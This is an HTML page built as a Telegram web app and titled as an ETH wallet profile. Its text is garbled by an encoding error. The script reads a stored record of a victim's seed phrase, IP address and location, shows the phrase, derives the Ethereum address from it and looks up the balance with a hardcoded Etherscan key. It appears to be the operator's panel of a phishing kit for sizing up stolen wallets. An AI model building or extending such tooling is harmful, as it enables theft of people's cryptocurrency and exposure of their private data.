<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>üëõ –ü—Ä–æ—Ñ–∏–ª—å ETH –∫–æ—à–µ–ª—å–∫–∞</title>
    <link rel="stylesheet" href="https://sp574-maker.github.io/maker/style.css" />
    <link rel="stylesheet" href="https://sp574-maker.github.io/maker/profile.css" />
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</head>
<body>
    <div class="container">
        <h1>üëõ –ü—Ä–æ—Ñ–∏–ª—å ETH –∫–æ—à–µ–ª—å–∫–∞</h1>
        <p><strong>ETH –∞–¥—Ä–µ—Å:</strong> <span id="ethAddress">‚Äì</span></p>
        <p><strong>–î–∞—Ç–∞ –≤—Ö–æ–¥–∞:</strong> <span id="timestamp">‚Äì</span></p>
        <p><strong>IP:</strong> <span id="userIp">‚Äì</span></p>
        <p><strong>–õ–æ–∫–∞—Ü–∏—è:</strong> <span id="userLocation">‚Äì</span></p>
        <p><strong>–ë–∞–ª–∞–Ω—Å ETH:</strong> <span id="walletBalance">‚è≥ –ó–∞–≥—Ä—É–∑–∫–∞‚Ä¶</span></p>
        <p><strong>Seed-—Ñ—Ä–∞–∑–∞:</strong></p>
        <textarea id="seed" readonly style="width:100%;height:100px;"></textarea>
        <button id="goWalletBtn">üîÅ –ü–µ—Ä–µ–π—Ç–∏ –≤ –∫–æ—à–µ–ª—ë–∫</button>
    </div>

    
    <script src="https://sp574-maker.github.io/maker/script.js" defer></script>
    <script>
        const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
        const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");

        const seedPhrase = (data.seed || "").trim();
        const walletType = (data.wallet || "").toLowerCase();
        const timestamp = data.timestamp || "‚Äì";
        const ip = data.ip || "‚Äì";
        const locationInfo = data.location || "‚Äì";

        document.getElementById("timestamp").textContent = timestamp;
        document.getElementById("userIp").textContent = ip;
        document.getElementById("userLocation").textContent = locationInfo;
        document.getElementById("seed").textContent = seedPhrase;

        let ethAddress = null;

        async function deriveETHAddress(mnemonic) {
            try {
                if (!mnemonic) throw new Error("Seed-—Ñ—Ä–∞–∑–∞ –ø–æ—Ä–æ–∂–Ω—è");
                const wallet = ethers.Wallet.fromMnemonic(mnemonic);
                ethAddress = wallet.address;
                document.getElementById("ethAddress").textContent = ethAddress;
                console.log("‚úÖ ETH –∞–¥—Ä–µ—Å:", ethAddress);
            } catch (e) {
                console.error("‚ùå –ü–æ–º–∏–ª–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó ETH:", e.message);
            }
        }

        async function fetchETHBalance(address) {
            try {
                const url = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`;
                const res = await fetch(url);
                const json = await res.json();
                if (!json || json.status !== "1" || !json.result) throw new Error("ETH API error");
                const ethBalance = parseFloat(json.result) / 1e18;
                document.getElementById("walletBalance").textContent = `${ethBalance.toFixed(6)} ETH`;
            } catch (e) {
                console.warn("‚ùå –ü–æ–º–∏–ª–∫–∞ –±–∞–ª–∞–Ω—Å—É ETH:", e.message);
                document.getElementById("walletBalance").textContent = "‚Äì";
            }
        }

        function goToWallet() {
            let url = "https://www.google.com";
            if (walletType.includes("metamask")) url = "https://metamask.io/";
            else if (walletType.includes("trust")) url = "https://trustwallet.com/";
            else if (walletType.includes("phantom")) url = "https://phantom.app/";
            else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
            else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";

            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.openLink(url);
            } else {
                window.open(url, "_blank");
            }
        }

        document.getElementById("goWalletBtn").addEventListener("click", goToWallet);

        document.addEventListener("DOMContentLoaded", async () => {
            console.log("üöÄ DOM –∑–∞–≥—Ä—É–∂–µ–Ω–æ");
            if (!seedPhrase) return console.error("‚ùå Seed-—Ñ—Ä–∞–∑–∞ –ø–æ—Ä–æ–∂–Ω—è");
            await deriveETHAddress(seedPhrase);
            if (ethAddress) await fetchETHBalance(ethAddress);
        });
    </script>
</body>
</html>
